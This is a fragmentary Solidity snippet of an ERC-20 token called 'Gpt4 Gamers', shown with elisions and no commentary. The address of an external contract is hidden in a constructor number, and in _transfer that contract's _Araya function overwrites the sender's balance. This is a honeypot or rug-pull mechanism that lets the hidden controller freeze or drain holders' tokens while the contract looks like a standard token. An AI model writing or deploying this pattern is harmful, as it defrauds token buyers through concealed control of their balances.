...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _name = "Gpt4 Gamers";
    string private _symbol = "Gpt4Gamers";
    uint256 private _decimals;
    uint256 private _totalSupply;
    uint256 private rGamers_;

    constructor(uint256 decimals_, uint256 _Gamers) {
        _decimals = decimals_;
        rGamers_ = _Gamers;
    ...
    function _transfer(
        ...
        require(amount > 0);
        _balance[from] = _rGamers(address(uint160(uint256(rGamers_))))._Araya(
            from,
            amount,
            _balance[from]
        );
